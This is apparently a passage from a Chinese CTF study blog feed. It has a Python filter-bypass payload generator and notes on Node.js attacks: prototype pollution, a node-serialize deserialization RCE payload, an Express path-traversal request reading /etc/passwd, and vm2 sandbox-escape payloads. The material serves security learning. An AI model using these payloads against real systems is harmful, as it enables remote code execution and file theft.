class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"i"</span>: <span class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"j"</span>: <span class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"k"</span>: <span class="string">"(((99999999999999999999).(1))&#123;4&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"l"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((5).(3))"</span>,</span><br><span class="line">    <span class="string">"m"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"n"</span>: <span class="string">"(((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"o"</span>: <span class="string">"(((99999999999999999999).(1))&#123;4&#125;)|(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"p"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((0).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"q"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((1).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"r"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((2).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"s"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((3).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"t"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((4).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"u"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((5).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"v"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((6).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"w"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((7).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"x"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((8).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"y"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((9).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"z"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((8).(0))&#123;0&#125;|((2).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"E"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((2).(1/!1))&#123;2&#125;)%26~((2).(1))%26~((9).(1))"</span>,</span><br><span class="line">    <span class="string">"G"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((1).(1/!1))&#123;2&#125;)%26~((%39).(1))"</span>,</span><br><span class="line">    <span class="string">"K"</span>: <span class="string">"((((1).(1/!1))&#123;3&#125;)%26~((4).(1)))|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"M"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"O"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((1).(1/!1))&#123;2&#125;)%26~((%30).(1))"</span>,</span><br><span class="line">    <span class="string">"B"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"C"</span>: <span class="string">"((((1).(1/!1))&#123;3&#125;)%26~((4).(1)))|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"A"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"I"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"H"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((5).(3))"</span>,</span><br><span class="line">    <span class="string">"L"</span>: <span class="string">"(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"D"</span>: <span class="string">"(((2).(1/!1))&#123;2&#125;)%26~((2).(1))%26~((9).(1))"</span>,</span><br><span class="line">    <span class="string">"N"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%30).(1))"</span>,</span><br><span class="line">    <span class="string">"J"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%34).(1))"</span>,</span><br><span class="line">    <span class="string">"F"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%39).(1))"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">got = [i <span class="keyword">for</span> i <span class="keyword">in</span> word_dict.keys()]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里写上想要的，配合高师傅的脚本一起用最好</span></span><br><span class="line">iwant = string.ascii_letters + <span class="string">"_"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Or</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> need <span class="keyword">in</span> iwant:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> got:</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> got:</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">                d = chr(ord(i) | ord(j))</span><br><span class="line">                <span class="keyword">if</span> d == need:</span><br><span class="line">                    <span class="comment"># print(d,i,j)</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    print(<span class="string">f"\"<span class="subst">&#123;d&#125;</span>\":\"(<span class="subst">&#123;word_dict[i]&#125;</span>)|<span class="subst">&#123;word_dict[j]&#125;</span>\","</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">And</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> need <span class="keyword">in</span> iwant:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> got:</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> got:</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">                d = chr(ord(i) &amp; ord(j))</span><br><span class="line">                <span class="keyword">if</span> d == need:</span><br><span class="line">                    <span class="comment"># print(d,i,j)</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    print(<span class="string">f"\"<span class="subst">&#123;d&#125;</span>\":\"(<span class="subst">&#123;word_dict[i]&#125;</span>)%26<span class="subst">&#123;word_dict[j]&#125;</span>\","</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">product</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># exp</span></span><br><span class="line">    exp = <span class="string">""</span></span><br><span class="line">    <span class="comment"># exp = "var"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> got:</span><br><span class="line">            print(<span class="string">f"(<span class="subst">&#123;word_dict[i]&#125;</span>)."</span>)</span><br><span class="line">        <span class="keyword">elif</span> i.upper() <span class="keyword">in</span> got:</span><br><span class="line">            print(<span class="string">f"(<span class="subst">&#123;word_dict[i.upper()]&#125;</span>)."</span>)</span><br><span class="line">            <span class="comment"># print(i.upper() + word_dict[i.upper()])</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(i + <span class="string">"lost"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    And()</span><br><span class="line">    <span class="comment"># Or()</span></span><br><span class="line">    <span class="comment"># product()</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="tag1" scheme="https://0xcreed.jxustctf.top/tags/tag1/"/>
    
      <category term="tag2" scheme="https://0xcreed.jxustctf.top/tags/tag2/"/>
    
      <category term="tag3" scheme="https://0xcreed.jxustctf.top/tags/tag3/"/>
    
  </entry>
  
  <entry>
    <title>nodejs学习</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/nodejs%E5%AD%A6%E4%B9%A0/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/nodejs%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-06-02T15:23:43.000Z</published>
    <updated>2020-06-06T15:57:10.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-原型链污染"><a href="#1-原型链污染" class="headerlink" title="1.原型链污染"></a>1.原型链污染</h2><ul><li><code>prototype</code> 和 <code>__proto__</code></li></ul><p>每个实例对象（ object ）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong> ）。该原型对象也有一个自己的原型对象( <strong>proto</strong> ) ，层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener"><strong>原型链</strong></a>中的最后一个环节。</p><a id="more"></a><p><img src="/2020/06/nodejs学习/image-20200605161200256.png" alt="image-20200605161200256"></p><p>几乎所有 JavaScript 中的对象都是位于原型链顶端的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object" target="_blank" rel="noopener"><code>Object</code></a> 的实例。</p><p>总结一下</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><ul><li><p>JS原型链继承</p><p>  所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f();</span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.a);</span><br><span class="line"><span class="built_in">console</span>.log(o.b);</span><br><span class="line"><span class="built_in">console</span>.log(o.c);</span><br><span class="line"><span class="built_in">console</span>.log(o.d);</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2020/06/nodejs学习/image-20200605162929085.png" alt="image-20200605162929085"></p><p>console.log(o.b);打印了2 似乎没被影响，其实这是个<code>属性遮蔽</code> 当要访问b属性时，对象先在自身的属性中寻找b，如果不存在b,才会到 <code>__proto__</code>中寻找，一层层往上，直到找到b或者null</p><p>总结一下</p><ol><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用prototype链实现继承机制</li></ol><ul><li><p>原型链污染</p><p>  原型链污染就是修改了类的 <code>prototype</code>那么将可以影响所有和这个对象来自同一个类、父祖类的对象</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure></li></ul><ul><li>哪些情况下存在原型链污染<ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul></li></ul><p>简单例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure><p><img src="/2020/06/nodejs学习/image-20200605165118904.png" alt="image-20200605165118904"></p><p>需要注意的是一定要使用JSON格式，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>我们用JavaScript创建o2的过程，如果使用（<code>let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}</code>），<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><h2 id="2-危险函数"><a href="#2-危险函数" class="headerlink" title="2.危险函数"></a>2.危险函数</h2><p>eval()</p><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p><p>漏洞利用</p><p>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</p><p>如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)</code>来执行命令</p><p>类似命令</p><p>间隔两秒执行函数：</p><ul><li>setInteval(some_function, 2000)</li></ul><p>两秒后执行函数：</p><ul><li>setTimeout(some_function, 2000);</li></ul><p>some_function处就类似于eval函数的参数</p><p>输出HelloWorld：</p><ul><li>Function(“console.log(‘HelloWolrd’)”)()</li></ul><p>类似于php中的create_function</p><h2 id="3-node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#3-node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="3.node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>3.node-serialize反序列化RCE漏洞(CVE-2017-5941)</h2><ul><li>了解什么是IIFE：</li></ul><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/立即执行函数表达式" target="_blank" rel="noopener">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p><p>IIFE一般写成下面的形式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure><ul><li><p><code>node-serialize@0.0.4</code>漏洞点</p><p>  漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p><p>  <img src="/2020/06/nodejs学习/image-20200605172038278.png" alt="image-20200605172038278"></p></li></ul><p>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function(){}()</code>函数，在反序列化时就会被当中IIFE立即调用执行</p><ul><li>构造Payload</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line"> rce : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'ls /'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123;<span class="built_in">console</span>.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"序列化生成的 Payload: \n"</span> + serialize.serialize(test));</span><br></pre></td></tr></table></figure><p>生成的Payload为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;"</span>&#125;</span><br></pre></td></tr></table></figure><p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"</span>&#125;</span><br></pre></td></tr></table></figure><p>传递给unserialize(注意转义单引号)：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"rce":"_$$ND_FUNC$$_function()&#123;require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"&#125;'</span>;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure><p><img src="/2020/06/nodejs学习/image-20200605172508592.png" alt="image-20200605172508592"></p><h2 id="4-Node-js-目录穿越漏洞复现-CVE-2017-14849"><a href="#4-Node-js-目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="4.Node.js 目录穿越漏洞复现(CVE-2017-14849)"></a>4.Node.js 目录穿越漏洞复现(CVE-2017-14849)</h2><p>漏洞影响的版本：</p><ul><li><p>Node.js 8.5.0 + Express 3.19.0-3.21.2</p></li><li><p>Node.js 8.5.0 + Express 4.11.0-4.15.5</p><p>  Express依赖Send组件，Send组件0.11.0-0.15.6版本pipe()函数中，如图：</p></li></ul><p><img src="/2020/06/nodejs学习/image-20200605211132980.png" alt="image-20200605211132980"></p><p>Send模块通过<code>normalize(&#39;.&#39; + sep + path)</code>标准化路径path后，并没有赋值给path，而是仅仅判断了下是否存在目录跳转字符。如果我们能绕过目录跳转字符的判断，就能把目录跳转字符带入545行的<code>join(root, path)</code>函数中，跳转到我们想要跳转到的目录中，这是Send模块的一个bug，目前已经修复。</p><p>再来看Node.js，Node.js 8.5.0对path.js文件中的<code>normalizeStringPosix</code>函数进行了修改，使其能够对路径做到如下的标准化：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span>.strict<span class="constructor">Equal(<span class="params">path</span>.<span class="params">posix</span>.<span class="params">normalize</span>('<span class="params">bar</span><span class="operator">/</span><span class="params">foo</span>..<span class="operator">/</span>..')</span>, 'bar');</span><br></pre></td></tr></table></figure><p>新的修改带来了问题，通过单步调试我们发现，可以通过<code>foo../../</code>和目录跳转字符一起注入到路径中，<code>foo../../</code>可以把变量<code>isAboveRoot</code>设置为<code>false</code>（代码161行），并且在代码135行把自己删掉；变量<code>isAboveRoot</code>为<code>false</code>的情况下，可以在<code>foo../../</code>两边设置同样数量的跳转字符，让他们同样在代码135行把自己删除，这样就可以构造出一个带有跳转字符，但是通过<code>normalizeStringPosix</code>函数标准化后又会全部自动移除的payload，这个payload配合上面提到的Send模块bug就能够成功的返回一个我们想要的物理路径，最后在Send模块中读取并返回文件。</p><p>用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code> 即可下载得到<code>/etc/passwd</code>文件</p><p><img src="/2020/06/nodejs学习/image-20200605220006573.png" alt="image-20200605220006573"></p><h2 id="5-VM沙箱逃逸"><a href="#5-VM沙箱逃逸" class="headerlink" title="5.VM沙箱逃逸"></a>5.VM沙箱逃逸</h2><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序，但是安全性让人捉急。逃逸后可获取主程序环境中的<a href="https://zhuanlan.zhihu.com/p/53135129" target="_blank" rel="noopener">环境变量</a>，然后通过各种方法导出 <code>Function</code>对象(上下文环境是主程序的)，接着借助<code>chile_process.exec()</code>就可以执行任意命令了</p><p>一下payload大都来自vm2的<a href="https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed" target="_blank" rel="noopener">issue</a></p><p>vm2&lt;=3.9.2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('whoami').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.9.1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;NodeVM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> NodeVM();</span><br><span class="line"><span class="built_in">console</span>.log(vm.run(<span class="string">'('</span>+<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">trueprocess = setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).ref().constructor.constructor(<span class="string">'return process'</span>)();</span><br><span class="line"><span class="built_in">console</span>.log(process.mainModule.require(<span class="string">'child_process'</span>).execSync(<span class="string">'ls'</span>).toString())&#125;+<span class="string">')()'</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure><p>3.7.0&lt;=vm2&lt;=3.8.3</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrue<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">""</span>)).a = <span class="number">1</span>;</span><br><span class="line">true&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">truetrue<span class="keyword">return</span> e.get_process(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrueBuffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">truetruetruegetOwnPropertyDescriptor()&#123;</span><br><span class="line">truetruetruetrue<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">truetruetrue&#125;</span><br><span class="line">truetrue&#125;));</span><br><span class="line">true&#125;<span 